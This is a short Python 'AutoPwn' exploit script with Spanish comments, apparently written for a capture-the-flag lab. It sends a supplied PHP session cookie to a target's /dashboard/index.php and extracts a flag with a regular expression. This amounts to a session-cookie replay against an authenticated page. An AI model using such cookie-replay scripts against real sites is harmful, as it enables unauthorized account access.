#!/usr/bin/python3

import argparse
import requests
import re
from colorama import Fore, Style

class Exploit:
    def __init__(self, ip_address, lport, cookie):
        self.ip_address = ip_address
        self.lport = lport
        self.cookie = cookie

    def run(self, ip_address, lport, cookie):
        # Construir la URL utilizando la dirección IP proporcionada
        url = 'http://' + self.ip_address + '/dashboard/index.php'

        # Realizar la solicitud GET con la cookie proporcionada en los encabezados
        response = requests.get(url, headers={'Cookie': self.cookie})
        content = response.text

        # Aplicar el filtro utilizando una expresión regular para buscar una "flag"
        pattern = r'Here is your flag: ([a-f0-9]+)'
        matches = re.findall(pattern, content)

        if matches:
            flag = matches[0]
            print(Fore.GREEN + f"\nEl contenido de la 'flag': {flag}\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + "No se encontró ninguna flag en la página." + Style.RESET_ALL)

def get_arguments():
    # Configurar el analizador de argumentos
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')

    # Agregar argumentos para la dirección IP, el puerto y la cookie
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', default=80, dest='lport', required=False, help='Proporcionar puerto.')
    parser.add_argument('-c', '--cookie', dest='cookie', required=True, help='Reemplazar con la cookie correcta, formato "PHPSESSID=i0jivian0b3ch8rpgbjjguggfo"')

    # Obtener los argumentos ingresados por el usuario
    return parser.parse_args()

def main():
    # Obtener los argumentos
    args = get_arguments()

    # Crear una instancia de la clase Exploit con los argumentos proporcionados
    exploit = Exploit(args.ip_address, args.lport, args.cookie)

    # Ejecutar el método run de la instancia de Exploit
    exploit.run(args.ip_address, args.lport, args.cookie)

if __name__ == '__main__':
    main()

